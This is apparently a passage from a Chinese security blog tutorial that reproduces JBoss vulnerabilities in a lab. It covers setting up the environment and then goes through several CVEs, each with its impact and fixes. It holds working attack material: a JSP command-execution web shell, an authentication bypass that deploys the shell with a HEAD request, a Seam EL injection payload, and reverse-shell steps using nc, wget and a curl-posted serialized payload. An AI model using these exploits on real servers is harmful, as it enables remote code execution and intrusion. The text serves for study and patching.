正式有一个名字，叫 WildFly， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><h4 id=\"jdk安装\"><a href=\"#jdk安装\" class=\"headerlink\" title=\"jdk安装\"></a>jdk安装</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200629230736581.png\" alt=\"image-20200629230736581\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> mkdir /usr/java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp jdk-6u32-linux-x64-rpm.bin /usr/java/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> chmod +x jdk-6u32-linux-x64-rpm.bin</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./jdk-6u32-linux-x64-rpm.bin</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">default                     latest                                 sun-javadb-demo-10.6.2-1.1.i386.rpm</span><br><span class=\"line\">jdk1.6.0_32                 sun-javadb-client-10.6.2-1.1.i386.rpm  sun-javadb-docs-10.6.2-1.1.i386.rpm</span><br><span class=\"line\">jdk-6u32-linux-amd64.rpm    sun-javadb-common-10.6.2-1.1.i386.rpm  sun-javadb-javadoc-10.6.2-1.1.i386.rpm</span><br><span class=\"line\">jdk-6u32-linux-x64-rpm.bin  sun-javadb-core-10.6.2-1.1.i386.rpm</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vi /etc/profile</span></span><br><span class=\"line\">export JAVA_HOME=/usr/java/jdk1.6.0_32</span><br><span class=\"line\">export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class=\"line\">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">source</span> /etc/profile</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -version</span></span><br><span class=\"line\">java version &quot;1.6.0_32&quot;</span><br><span class=\"line\">Java(TM) SE Runtime Environment (build 1.6.0_32-b05)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (build 20.7-b02, mixed mode)</span><br><span class=\"line\">OK</span><br><span class=\"line\">//也可以使用yum进行安装jdk</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum -y list java*\t\t\t//会列出所有jdk版本信息</span></span><br><span class=\"line\">//安装指定jdk</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum -y install java-1.7.0-openjdk*</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -version</span></span><br><span class=\"line\">java version &quot;1.7.0_261&quot;</span><br><span class=\"line\">OpenJDK Runtime Environment (rhel-2.6.22.2.el7_8-x86_64 u261-b02)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JBoss版本\"><a href=\"#JBoss版本\" class=\"headerlink\" title=\"JBoss版本\"></a>JBoss版本</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//JBoss全版本下载</span><br><span class=\"line\">https://jbossas.jboss.org/downloads</span><br><span class=\"line\">https://teddysun.com/260.html</span><br><span class=\"line\">//6.0版本</span><br><span class=\"line\">https://sourceforge.net/projects/jboss/files/JBoss/JBoss-6.0.0.Final/</span><br><span class=\"line\">//4.2.3版本</span><br><span class=\"line\">http://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA.zip/download</span><br></pre></td></tr></table></figure>\n\n<p>版本6.0</p>\n<p>JBoss-6.0.0.Final</p>\n<p><img src=\"/images/Jboss/image-20200629174602625.png\" alt=\"image-20200629174602625\"></p>\n<h4 id=\"JBoss安装\"><a href=\"#JBoss安装\" class=\"headerlink\" title=\"JBoss安装\"></a>JBoss安装</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip jboss-as-distribution-6.0.0.Final.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ll</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 版本替换须重启系统，以免无法访问最新替换系统。或启动run时报错。</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vim /etc/profile</span></span><br><span class=\"line\">export JBOSS_HOME=/usr/local/jboss-6.0.0.Final/</span><br><span class=\"line\">export PATH=$PATH:$JBOSS_HOME/bin</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">source</span> /etc/profile</span></span><br><span class=\"line\">//启动</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./run.sh -b 0.0.0.0</span></span><br><span class=\"line\">//curl请求尝试</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl -I http://127.0.0.1:8080/</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Server: Apache-Coyote/1.1</span><br><span class=\"line\">X-Powered-By: Servlet/3.0; JBossAS-6</span><br><span class=\"line\">Accept-Ranges: bytes</span><br><span class=\"line\">ETag: W/&quot;1554-1293496144000&quot;</span><br><span class=\"line\">Last-Modified: Tue, 28 Dec 2010 00:29:04 GMT</span><br><span class=\"line\">Content-Type: text/html</span><br><span class=\"line\">Content-Length: 1554</span><br><span class=\"line\">Date: Tue, 30 Jun 2020 12:22:53 GMT</span><br><span class=\"line\">//关闭本地防火墙防止无法访问</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> systemctl stop firewalld.service</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630134941050.png\" alt=\"image-20200630134941050\"></p>\n<h4 id=\"JavaDeserH2HC\"><a href=\"#JavaDeserH2HC\" class=\"headerlink\" title=\"JavaDeserH2HC\"></a>JavaDeserH2HC</h4><p>此工具主要用于检测和测试反序列化类漏洞，项目地址已经贴到下面。</p>\n<p><a href=\"https://github.com/joaomatosf/JavaDeserH2HC\">JavaDeserH2HC</a></p>\n<h3 id=\"漏洞分类实战\"><a href=\"#漏洞分类实战\" class=\"headerlink\" title=\"漏洞分类实战\"></a>漏洞分类实战</h3><h4 id=\"CVE-2006-5750\"><a href=\"#CVE-2006-5750\" class=\"headerlink\" title=\"CVE-2006-5750\"></a>CVE-2006-5750</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>CVE-2007-1036漏洞相同，CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。</p>\n<h5 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><h5 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、参考CVE-2010-0738漏洞</p>\n<h4 id=\"CVE-2007-1036\"><a href=\"#CVE-2007-1036\" class=\"headerlink\" title=\"CVE-2007-1036\"></a>CVE-2007-1036</h4><p>JMX Console HtmlAdaptor Getshell</p>\n<h5 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>由于JBoss对 /jmx-console/HtmlAdaptor 路径未做任何认证措施，导致这个服务完全对外开放，可直接访问控制台部署shell。</p>\n<h5 id=\"影响范围-1\"><a href=\"#影响范围-1\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>全版本</p>\n<h5 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>\n<h5 id=\"漏洞实战\"><a href=\"#漏洞实战\" class=\"headerlink\" title=\"漏洞实战\"></a>漏洞实战</h5><p>1、URL访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.135:8080/jmx-console/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630141919387.png\" alt=\"image-20200630141919387\"></p>\n<p>2、创建war包木马</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  jsp jar -cvf muma.war shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p>3、部署远程木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">部署远程war必须确保war提供web能够访问否则怎么叫远程部署呢？</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630143911494.png\" alt=\"image-20200630143911494\"></p>\n<p><img src=\"/images/Jboss/image-20200630143935231.png\" alt=\"image-20200630143935231\"></p>\n<center>部署完成结果</center>\n4、访问木马\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.135:8080/muma/shell.jsp</span><br><span class=\"line\">//如出现500即为部署成功只是无法解析</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630144229517.png\" alt=\"image-20200630144229517\"></p>\n<p>5、管理工具连接</p>\n<p><img src=\"/images/Jboss/image-20200630144201038.png\" alt=\"image-20200630144201038\"></p>\n<h5 id=\"漏洞修复-1\"><a href=\"#漏洞修复-1\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>因jboss默认未设置密码，导致jmx-console可远程部署war并导致被攻击。</p>\n<p>1、开启安全配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//注释去掉(6.x版本修改下面文件)</span><br><span class=\"line\">/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml</span><br><span class=\"line\">//4.x版本修改下面文件</span><br><span class=\"line\">/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630145646406.png\" alt=\"image-20200630145646406\"></p>\n<p>2、web.xml配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630145856647.png\" alt=\"image-20200630145856647\"></p>\n<p>3、设置账号及密码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改账号及密码（默认是admin/admin）</span><br><span class=\"line\">server/default/conf/props/jmx-console-users.properties</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630150052719.png\" alt=\"image-20200630150052719\"></p>\n<p>4、访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改以上配置后记得重启Jboss</span><br><span class=\"line\">//直接停止run.sh</span><br><span class=\"line\">//进程查看</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ps aux | grep jboss</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">kill</span> -9 PID</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630150711860.png\" alt=\"image-20200630150711860\"></p>\n<h4 id=\"CVE-2010-0738\"><a href=\"#CVE-2010-0738\" class=\"headerlink\" title=\"CVE-2010-0738\"></a>CVE-2010-0738</h4><h5 id=\"漏洞描述-2\"><a href=\"#漏洞描述-2\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>JBoss默认仅对“GET”和“POST”方法启用安全限制。</p>\n<p>使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证，直接调用jmx-console实现的任何功能。</p>\n<p>注意：如果JMX控制台回复HTTP 500错误，则表示请求已正确处理。</p>\n<h5 id=\"影响范围-2\"><a href=\"#影响范围-2\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBossAS &lt; 4.3</p>\n<h5 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss默认仅对“GET”和“POST”方法启用安全限制；使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jboss-4.2.3.GA/server/default/deploy/jmx-console.war/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701103827156.png\" alt=\"image-20200701103827156\"></p>\n<h5 id=\"漏洞检测-1\"><a href=\"#漏洞检测-1\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、URL请求</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin:service=DeploymentFileRepository</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701142719465.png\" alt=\"image-20200701142719465\"></p>\n<p>2、参数对应值</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 路径</span></span><br><span class=\"line\">shell.war</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 文件名</span></span><br><span class=\"line\">shell</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 文件后缀</span></span><br><span class=\"line\">.jsp</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 文件内容</span></span><br><span class=\"line\">&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如POST提交需认证，修改请求方法未HEAD并复制POST数据至URL处</span></span><br><span class=\"line\">action=invokeOp&amp;name=jboss.admin:service=DeploymentFileRepository&amp;methodIndex=6&amp;arg0=../jmx-console.war/&amp;arg1=shell&amp;arg2=.jsp&amp;arg3=&lt;%Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;));%&gt;&amp;arg4=True</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 访问(获取当前目录文件夹及文件)</span></span><br><span class=\"line\">http://172.16.144.139:8080/jmx-console/shell.jsp?i=touch%201.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701153249170.png\" alt=\"image-20200701153249170\"></p>\n<p><img src=\"/images/Jboss/image-20200701152708158.png\" alt=\"image-20200701152708158\"></p>\n<p>3、shell新建文件</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.139:8080/shell/shell.jsp?i=touch%201.txt</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200701152747850.png\" alt=\"image-20200701152747850\"></p>\n<p><img src=\"/images/Jboss/image-20200701152836122.png\" alt=\"image-20200701152836122\"></p>\n<h5 id=\"漏洞修复-2\"><a href=\"#漏洞修复-2\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、升级最新版本</p>\n<p>2、设置登录认证(参考CVE-2007-1036修复)</p>\n<h4 id=\"CVE-2010-1871\"><a href=\"#CVE-2010-1871\" class=\"headerlink\" title=\"CVE-2010-1871\"></a>CVE-2010-1871</h4><h5 id=\"漏洞描述-3\"><a href=\"#漏洞描述-3\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p><code>JBossSeam</code>是一个<code>JavaEE5</code>框架，把JSF与<code>EJB3.0</code>组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。</p>\n<p><code>JBossSeam</code>处理某些参数化<code>JBossEL</code>表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的<code>JBossSeam</code>用户访问特制的网页，就可能导致执行任意代码。</p>\n<h5 id=\"影响范围-3\"><a href=\"#影响范围-3\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS = 4.3.0（4.3.0属于企业版，导致部分环境没法搭建复现）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//4.3.0等版本下载</span><br><span class=\"line\">http://ftp.riken.jp/Linux/redhat/ftp.redhat.com/jboss/eap/4.3.0/en/source/</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞原理-3\"><a href=\"#漏洞原理-3\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>漏洞是通过<code>seam</code>组件中插入<code>#&#123;payload&#125;</code>进行模板注入，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法），从而可以传入任何想要执行的命令。</p>\n<h5 id=\"漏洞检测-2\"><a href=\"#漏洞检测-2\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、漏洞位置描述</p>\n<p>漏洞是通过seam组件中插入#{payload}进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（<code>Java.lang.Runtime.getRuntime().exec()</code>方法）,从而可以传入任何想要执行的命令。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23&#123;&#125;的#&#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2、PoC</p>\n<p>cmd代表传入的远程命令。在<code>/admin-console/login.seam</code>路径下，POST传入构造好的<code>payload</code>，即可对此漏洞利用。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">actionOutcome=/success.xhtml?user%<span class=\"number\">3d</span>%<span class=\"number\">23</span>&#123;expressions.getClass().forName(<span class=\"string\">&#x27;Java.lang.Runtime&#x27;</span>).getDeclaredMethod(<span class=\"string\">&#x27;getRuntime&#x27;</span>).invoke(expressions.getClass().forName(<span class=\"string\">&#x27;Java.lang.Runtime&#x27;</span>)).exec(cmd)&#125;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"漏洞修复-3\"><a href=\"#漏洞修复-3\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、补丁修复</p>\n<h4 id=\"CVE-2013-4810\"><a href=\"#CVE-2013-4810\" class=\"headerlink\" title=\"CVE-2013-4810\"></a>CVE-2013-4810</h4><h5 id=\"漏洞描述-4\"><a href=\"#漏洞描述-4\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>此漏洞和<code>CVE-2015-7501</code>漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中<code>JMXInvokerServlet</code>和<code>EJBInvokerServlet</code>利用的是<code>org.jboss.invocation.MarshalledValue</code>进行的反序列化操作，</p>\n<p>而<code>web-console/Invoker</code>利用的是<code>org.jboss.console.remote.RemoteMBeanInvocation</code>进行反序列化并上传构造好文件。</p>\n<h5 id=\"影响范围-4\"><a href=\"#影响范围-4\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS 6.X</p>\n<h5 id=\"漏洞原理-4\"><a href=\"#漏洞原理-4\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><h5 id=\"漏洞检测-3\"><a href=\"#漏洞检测-3\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、参考CVE-2015-7501</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;漏洞路径</span><br><span class=\"line\">&#x2F;invoker&#x2F;EJBInvokerServlet</span><br><span class=\"line\">http:&#x2F;&#x2F;172.16.144.157:8080&#x2F;invoker&#x2F;EJBInvokerServlet</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702153308520.png\" alt=\"image-20200702153308520\"></p>\n<p>2、反弹shell</p>\n<p>直接参考CVE-2015-7501</p>\n<h5 id=\"漏洞修复-4\"><a href=\"#漏洞修复-4\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、<a href=\"https://access.redhat.com/security/cve/cve-2015-7501\">补丁</a></p>\n<h4 id=\"CVE-2015-7501\"><a href=\"#CVE-2015-7501\" class=\"headerlink\" title=\"CVE-2015-7501\"></a>CVE-2015-7501</h4><h5 id=\"漏洞描述-5\"><a href=\"#漏洞描述-5\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放，JBoss的<code>jmx</code>组件⽀持Java反序列化导致产生漏洞。</p>\n<h5 id=\"影响范围-5\"><a href=\"#影响范围-5\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS 6.x</p>\n<h5 id=\"漏洞原理-5\"><a href=\"#漏洞原理-5\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>由于<code>JBoss</code>中<code>invoker/JMXInvokerServlet</code>路径对外开放</p>\n<h5 id=\"漏洞检测-4\"><a href=\"#漏洞检测-4\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、PoC</p>\n<p>浏览器直接访问域名，如出现下载文档即可确定存在漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;172.16.144.156:8080&#x2F;invoker&#x2F;JMXInvokerServlet</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702122358123.png\" alt=\"image-20200702122358123\"></p>\n<p>2、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> nc -lvnp 5555(攻击主机执行监听)</span></span><br><span class=\"line\">//攻击主机目录下下载</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> wget http://scan.javasec.cn/java/JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip JavaDeserH2HC.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">cd</span> JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:5555\t\t\t\t(攻击主机及端口号)</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl http://172.16.144.157:8080/invoker/<span class=\"built_in\">readonly</span> --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702134459047.png\" alt=\"image-20200702134459047\"></p>\n<h5 id=\"漏洞修复-5\"><a href=\"#漏洞修复-5\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、<a href=\"https://access.redhat.com/security/cve/cve-2015-7501\">补丁</a></p>\n<h4 id=\"CVE-2017-7504\"><a href=\"#CVE-2017-7504\" class=\"headerlink\" title=\"CVE-2017-7504\"></a>CVE-2017-7504</h4><h5 id=\"漏洞描述-6\"><a href=\"#漏洞描述-6\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的<code>JMS over HTTP Invocation Layer</code>的<br>HTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤<br>该漏洞执⾏任意代码。</p>\n<h5 id=\"影响范围-6\"><a href=\"#影响范围-6\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBoss AS 4.x之前版本</p>\n<h5 id=\"漏洞原理-6\"><a href=\"#漏洞原理-6\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss AS 4.x及之前版本中，JbossMQ实现过程的<code>JMS over HTTP Invocation Layer</code>的<br>HTTPServerILServlet.java⽂件存在反序列化漏洞。</p>\n<h5 id=\"漏洞检测-5\"><a href=\"#漏洞检测-5\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><p>1、PoC</p>\n<p>访问域名，如出现以下返回可能存在漏洞。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">172.16.144.157:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200702140433362.png\" alt=\"image-20200702140433362\"></p>\n<p>2、反弹shell</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 